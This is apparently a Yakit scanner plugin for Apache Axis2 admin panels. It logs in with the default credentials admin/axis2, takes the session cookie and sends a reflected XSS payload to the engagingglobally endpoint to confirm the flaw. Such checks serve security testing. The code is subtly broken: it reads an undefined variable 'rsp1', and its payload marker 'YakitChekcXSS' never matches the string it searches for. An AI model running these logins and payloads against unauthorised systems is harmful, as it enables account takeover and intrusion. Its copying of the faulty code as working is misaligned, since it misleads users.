# port scan plugin
yakit.AutoInitYakit()

login = func(target,port,path){
    addr = str.HostPort(target, port)
    isTls = str.IsTLSServer(addr)
    packet = `
POST {{params(path)}}axis2-admin/login HTTP/1.1
Host: {{params(target)}}
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: deflate
Accept-Language: zh-CN,zh;q=0.9
Cache-Control: max-age=0
Connection: close
Content-Length: 48
Content-Type: application/x-www-form-urlencoded
Dnt: 1
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36

userName=admin&password=axis2&submit=+Login+
`
    rsp,req,_ = poc.HTTP(packet, 
    poc.params({
        "target":addr,
        "path":path,}),
    poc.https(isTls),
    poc.redirectTimes(0),)
    if len(rsp) > 0 {
        if str.MatchAllOfSubString(rsp1, "Welcome to Axis2 Web Admin Module !!"){
            repa,_ = re.Compile("Set-Cookie: (.*?);") 
            cookie = repa.FindAllStringSubmatch(rsp,-1)[0][1]
            return cookie
        }
    
    }
    return
}

handleCheck = func(target,port,cookie,path){
    addr = str.HostPort(target, port)
    isTls = str.IsTLSServer(addr)

    packet = `GET {{params(path)}}axis2-admin/engagingglobally?submit=%2bEngage%2b&modules=%3Cscript%3Ealert(YakitChekcXSS)%3C/script%3E HTTP/1.1
Host: {{params(target)}}
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Length: 0
Cookie:	JSESSIONID={{params(cookie)}}
Dnt: 1
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36
`

    rsp,req,_ = poc.HTTP(packet, 
    poc.params({"target":addr,"cookie":cookie,"path":path,}),
    poc.https(isTls),
    poc.redirectTimes(0),
    )
    dump(rsp)
    if len(rsp) > 0 {
        
        if str.MatchAllOfSubString(rsp, "YakitCheckXSS"){
            yakit.Info("%v found Axis2 admin XSS漏洞 ", addr)
            risk.NewRisk(
            addr,risk.title("Axis2 admin XSS"),
            risk.severity("low"),
            risk.titleVerbose("Axis2 admin XSS漏洞"),
            risk.type("xss[Axis2]"),
            risk.payload(`/axis2-admin/engagingglobally?submit=%%2bEngage%%2b&modules=%%3Cscript%%3Ealert(YakitChekcXSS)%%3C/script%%3E`),
        )
        }
       
    }

    return
}

handle = func(result /* *fp.MatchResult */) {
    // handle match result
    if !result.IsOpen(){
        return
    }
    r,_ = re.Compile(`Path=(.*?);`)
    path = r.FindStringSubmatch(string(result.Fingerprint))[1]
    if len(result.Fingerprint.HttpFlows)>0{
        cookie = login(result.Target,result.Port,path)
        handleCheck(result.Target,result.Port,cookie,path)
    }
    
}
